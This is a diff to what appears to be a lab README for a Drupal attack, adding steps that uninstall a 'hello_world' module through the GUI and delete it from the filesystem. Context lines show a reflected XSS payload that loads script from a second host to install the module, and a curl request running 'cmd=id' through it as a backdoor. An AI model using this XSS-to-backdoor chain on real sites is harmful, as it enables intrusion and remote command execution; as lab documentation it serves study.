@@ -74,9 +74,17 @@ http://192.168.5.17/test/rxss.php?q=<script src=http://192.168.5.13/installModul
 curl -s "http://192.168.5.17/hello-world?pass=test&cmd=id" | head -n 1
 ```
 
-6. [optional] uninstall module
+6. [optional] uninstall module - uninstall module via GUI
 
 *Drupal -> Extend -> [tab] Uninstall -> (filter by name) hello -> (mark checkbox) Hello World -> Uninstall -> Uninstall*
+
+7. [optional] uninstall module - remove module from filesystem
+
+```
+sudo su
+cd /var/www/html/drupal/modules
+rm -rf hello_world
+```
 
 ## Screenshots
 
